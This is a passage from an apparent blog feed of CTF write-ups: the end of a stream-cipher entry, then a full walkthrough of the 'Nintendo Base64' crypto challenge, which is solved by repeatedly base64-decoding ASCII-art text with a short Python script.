<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Result: 0a68352e141d1152060003310c1d500b0d131d38124900003a52121a010900734b070c07543b45020c1d7f0213162b56144c1d111d0f074c043c06002c184e1b1f0b7f070d150c1c541117543c13111515064b1e1c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Result: CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nintendo Base64 - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the challenge Nintendo Base64, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the challenge Nintendo Base64, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>Aliens are trying to cause great misery for the human race by using our own cryptographic technology to encrypt all our games.</p>
<p>Fortunately, the aliens haven't played CryptoHack so they're making several noob mistakes. Therefore they've given us a chance to recover our games and find their flags.</p>
<p>They've tried to scramble data on an N64 but don't seem to understand that encoding and ASCII art are not valid types of encryption!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>Really, the prompt pretty much tells us all we need to know. We look at the <code>output.txt</code> file we've received, and see that it's a string of random letters shaped into ASCII art.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">            Vm                                                   0w               eE5GbFdWW         GhT            V0d4VVYwZ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            G9              XV                                   mx              yWk    ZOV       1JteD           BaV     WRH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            YW                                   xa             c1              NsWl dS   M1   JQ WV       d4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">S2RHVkljRm  Rp UjJoMlZrZH plRmRHV m5WaVJtUl hUVEZLZVZk   V1VrZFpWMU  pHVDFaV1Z  tSkdXazlXYW   twdl   Yx    Wm Fj  bHBFVWxWTlZ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Xdz     BWa 2M xVT     FSc  1d   uTl     hi R2h     XWW taS     1dG VXh     XbU ZTT     VdS elYy     cz     FWM    kY2VmtwV2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JU       RX dZ ak       Zr  U0   ZOc2JGWmlS a3       BY V1       d0 YV       lV MH       hj RVpYYlVaVFRWW  mF lV  mt       3V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lR       GV 01 ER       kh  Zak  5rVj   JFe VR       Ya Fdha   3BIV mpGU   2NtR kdX     bWx          oT   TB   KW VYxW   lNSM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Wx       XW kV kV       mJ  GWlRZ bXMxY2xWc 1V       sZ  FRiR1J5VjJ  0a1YySkdj   RVpWVmxKV           1V            GRTlQUT09</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can also probably quite safely assume, that this is encoded in base64.</p>
<p>So, as part of our analysis, we strip the string of its spaces and newlines, and feed it to <code>base64 -d</code></p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> output.txt </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tr</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">' '</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tr</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">n </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> base64 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">Vm0xNFlWVXhSWGxUV0doWVlrZFNWRmx0ZUdGalZsSlZWR3RPYWxKdGVIcFdiR2h2VkdzeFdGVnViRmRXTTFKeVdWUkdZV1JGT1ZWVmJGWk9WakpvV1ZaclpEUlVNVWw0Vkc1U1RsWnNXbGhWYkZKWFUxWmFSMWRzV2s1V2F6VkpWbTEwYjFkSFNsbFZiRkpXWWtaYU0xcEZXbUZTTVZaeVkwVTFWMDFHYjNkV2EyTXhWakpHVjFScmFGWmlhM0JYV1ZSR1lWZEdVbFZTYms1clVsUldTbGRyV2tkV2JGcEZVVlJWUFE9PQ</span><span class="token operator" style="color:#393A34">==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But we notice, that the output of that command is yet another base64 string (given away by the equal signs at the end).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/nintendo-base64-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>So, let's just write a simple script which</p>
<ol>
<li>Opens the <code>output.txt</code> file, and strips the content of newlines and spaces</li>
<li>Feed it into a loop which applies <code>b64decode</code></li>
<li>And print the output, if it starts with our flag prompt <code>CHTB{</code></li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64 </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> b64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'output.txt.2'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'r'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  shouldContinue </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  candidate </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'\n'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">' '</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> shouldContinue</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    candidate </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> b64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">candidate</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b'CHTB{'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> candidate</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> candidate</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      shouldContinue </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So, we get the flag just like that</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
</feed>